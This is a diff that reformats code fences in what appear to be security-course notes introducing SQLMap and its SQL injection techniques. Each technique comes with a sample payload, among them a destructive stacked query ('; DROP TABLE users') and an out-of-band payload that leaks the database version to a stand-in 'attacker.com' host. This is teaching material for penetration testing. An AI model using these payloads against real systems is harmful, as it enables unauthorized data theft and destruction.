@@ -4,8 +4,7 @@
 
 [SQLMap](https://github.com/sqlmapproject/sqlmap) is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws. SQLMap has been continuously developed since 2006 and is still maintained today.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
 
        ___
@@ -45,22 +44,19 @@ SQLMap comes with a powerful detection engine, numerous features, and a broad ra
 
 SQLMap is pre-installed on your Pwnbox, and the majority of security-focused operating systems. SQLMap is also found on many Linux Distributions' libraries. For example, on Debian, it can be installed with:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo apt install sqlmap
 ```
 
 If we want to install manually, we can use the following command in the Linux terminal or the Windows command line:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
 ```
 
 After that, SQLMap can be run with:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python sqlmap.py
 ```
 
@@ -90,8 +86,7 @@ The SQLMap team also works to add and support new DBMSes periodically.
 
 SQLMap is the only penetration testing tool that can properly detect and exploit all known SQLi types. We see the types of SQL injections supported by SQLMap with the `sqlmap -hh` command:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sqlmap -hh
 ...SNIP...
   Techniques:
@@ -113,8 +108,7 @@ The technique characters `BEUSTQ` refers to the following:
 
 Example of `Boolean-based blind SQL Injection`:
 
-```
-        SQL
+```sql
 AND 1=1
 ```
 
@@ -130,8 +124,7 @@ SQLMap exploits `Boolean-based blind SQL Injection` vulnerabilities through the 
 
 Example of `Error-based SQL Injection`:
 
-```
-        SQL
+```sql
 AND GTID_SUBSET(@@version,0)
 ```
 
@@ -151,8 +144,7 @@ Error-based SQLi is considered as faster than all other types, except UNION quer
 
 Example of `UNION query-based SQL Injection`:
 
-```
-        SQL
+```sql
 UNION ALL SELECT 1,@@version,3
 ```
 
@@ -164,8 +156,7 @@ With the usage of `UNION`, it is generally possible to extend the original (`vul
 
 Example of `Stacked Queries`:
 
-```
-        SQL
+```sql
 ; DROP TABLE users
 ```
 
@@ -177,8 +168,7 @@ Stacking SQL queries, also known as the "piggy-backing," is the form of injectin
 
 Example of `Time-based blind SQL Injection`:
 
-```
-        SQL
+```sql
 AND 1=IF(2>1,SLEEP(5),0)
 ```
 
@@ -195,8 +185,7 @@ The principle of `Time-based blind SQL Injection` is similar to the `Boolean-bas
 
 Example of `Inline Queries`:
 
-```
-        SQL
+```sql
 SELECT (SELECT @@version) from
 ```
 
@@ -208,8 +197,7 @@ This type of injection embedded a query within the original query. Such SQL inje
 
 Example of `Out-of-band SQL Injection`:
 
-```
-        SQL
+```sql
 LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
 ```
 
